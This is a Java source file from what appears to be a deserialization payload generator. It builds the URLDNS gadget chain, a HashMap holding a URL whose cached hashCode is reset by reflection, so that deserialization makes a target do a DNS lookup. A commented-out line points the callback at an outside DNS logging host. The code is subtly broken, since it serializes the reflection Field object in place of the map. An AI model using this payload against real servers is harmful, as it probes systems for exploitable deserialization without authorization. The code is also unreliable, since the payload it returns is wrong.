package org.hasret.webserigen.payloads;

import java.io.*;
import java.lang.reflect.Field;

import java.util.Base64;
import java.util.HashMap;
import java.net.URL;
// *   Gadget Chain:
//        *     HashMap.readObject()
// *       HashMap.putVal()
// *         HashMap.hash()
// *           URL.hashCode()
// *

public class URLDNS {


    public static String generatePayload(final String cmd) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        HashMap<URL,Integer> hashMap =   new HashMap();

        URL url = new URL(cmd);
        Class c = Class.forName("java.net.URL");
        Field f = c.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url,1234);

        hashMap.put(url,1);

        f.set(url,-1);

//        ObjectOutputStream oos = new ObjectOutputStream(new ByteArrayOutputStream());
//        oos.writeObject(hashMap);
//        oos.close();

        //readobj
//        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ser.bin"));
//        Object o = ois.readObject();
        return  serializeBytesToB64(f);
    }


    public static String serializeBytesToB64(Object obj) throws IOException {
        try(ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(obj);
            oos.flush();
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        }
    }
    public static void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException {
       // String s = generatePayload("http://56d0187f.log.dnslog.sbs");
    }
}
